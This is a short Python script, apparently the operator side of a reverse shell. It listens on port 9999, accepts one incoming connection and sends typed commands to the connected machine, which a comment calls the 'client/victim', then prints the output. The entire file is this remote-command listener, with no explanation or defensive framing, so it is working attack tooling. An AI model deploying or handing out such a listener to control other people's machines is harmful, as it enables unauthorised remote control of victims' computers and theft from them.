import socket
import sys

# Create a Socket ( connect two computer )
def createSocket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening or connections
def bindSocket():
    try:
        global host
        global port
        global s

        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bindSocket()


# Establish connection with a client (socket must be listening)
def socketAccept():
    conn, address = s.accept()
    print(
        "Connection has been established! "
        + "IP: "
        + address[0]
        + " Port: "
        + str(address[1])
    )
    sendCommand(conn)
    conn.close()


# Send commmands to client/victim or a friend
def sendCommand(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            clientResponse = str(conn.recv(1024), "utf-8")
            print(clientResponse, end="")


def main():
    createSocket()
    bindSocket()
    socketAccept()


main()
